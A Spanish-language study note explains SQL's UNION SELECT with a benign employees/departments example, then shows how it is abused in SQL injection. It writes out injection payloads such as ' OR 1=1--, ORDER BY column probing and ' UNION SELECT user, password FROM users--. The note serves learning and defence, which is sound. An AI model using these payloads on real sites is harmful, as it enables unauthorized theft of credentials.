# Introducción a UNION SELECT en SQL (y su aplicación en SQLi)

## Objetivo del documento

Entender el funcionamiento y la lógica de la cláusula `UNION SELECT` en SQL, partiendo de un ejemplo práctico legítimo, para después comprender cómo puede ser usada de forma maliciosa durante un ataque de **SQL Injection** ([[SQLi]]).

---

## ¿Qué es `UNION SELECT`?

La cláusula `UNION` en SQL permite **combinar los resultados de dos o más consultas SELECT** en una sola tabla de resultados.

**Nota:** podemos ver un ejemplo en [[UNION SELECT - Ejemplo]]
### Requisitos básicos:

1. **Mismo número de columnas** en cada SELECT.
2. **Tipos de datos compatibles** entre las columnas correspondientes.
3. La primera SELECT determina los nombres de las columnas del resultado final.
4. `UNION` elimina duplicados por defecto.
5. Si se quieren incluir duplicados, se usa `UNION ALL`.

---

## Ejemplo legítimo: ejercicio práctico

En un servidor MariaDB se usó esta consulta para unir identificadores de dos tablas diferentes:

```sql
SELECT COUNT(*) FROM (
  SELECT emp_no FROM employees
  UNION
  SELECT dept_no FROM departments
) AS total_union;
````

### ¿Qué hicimos aquí?

- Seleccionamos una sola columna de cada tabla (`emp_no` y `dept_no`).
    
- Las unimos en un solo conjunto de resultados.
    
- Contamos cuántos registros únicos resultaban tras la unión.
    

---

## Aplicación en SQL Injection

### Contexto

Cuando una aplicación web construye dinámicamente consultas SQL a partir de entradas del usuario **sin sanitizarlas correctamente**, un atacante puede inyectar código malicioso. Una técnica común es usar `UNION SELECT` para:

- Leer información de otras tablas.
    
- Bypassear validaciones.
    
- Obtener datos sensibles (como contraseñas, usuarios, etc).
    

---

## Ejemplo básico de SQLi con `UNION SELECT`

Imaginemos una URL vulnerable como esta:

```
http://victima.com/product.php?id=10
```

Y en el backend ocurre algo como:

```sql
SELECT name, price FROM products WHERE id = 10;
```

Si el campo `id` no está bien validado, un atacante puede hacer:

```
http://victima.com/product.php?id=10 UNION SELECT user, password FROM users--
```

Lo que generaría una consulta como:

```sql
SELECT name, price FROM products WHERE id = 10
UNION
SELECT user, password FROM users;
```

### Resultado:

- Si las columnas coinciden en número y tipo, se mostrarían datos de otra tabla en el lugar donde el usuario espera ver productos.
    
- Esto permite exfiltrar información de forma silenciosa.
    

---

## Cómo identificar una SQLi con `UNION SELECT`

Pasos comunes de ataque:

1. **Verificar la vulnerabilidad**:
    
    ```sql
    ' OR 1=1--
    ```
    
2. **Descubrir el número de columnas**:
    
    ```sql
    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--  → Hasta que dé error
    ```
    
3. **Probar con NULLs para ajustar tipos**:
    
    ```sql
    ' UNION SELECT NULL, NULL--
    ```
    
4. **Obtener datos**:
    
    ```sql
    ' UNION SELECT user, password FROM users--
    ```
    

> Es importante destacar que este tipo de prueba **solo se debe hacer en entornos controlados o con autorización explícita**. La realización de ataques sin permiso es ilegal.

---

## Conclusión

- `UNION SELECT` es una herramienta poderosa tanto para **consultas legítimas** como para **ataques SQLi**.
    
- Entender cómo se comporta esta cláusula permite:
    
    - Redactar mejores consultas SQL.
        
    - Detectar y prevenir vulnerabilidades en aplicaciones web.
        
- Practicar con ejercicios legítimos, como el de unir `employees` y `departments`, es un buen paso previo para entender su abuso en SQLi.
    

---

## Recursos recomendados

- [OWASP - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
    
- [PayloadAllTheThings - SQLi Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
    

---
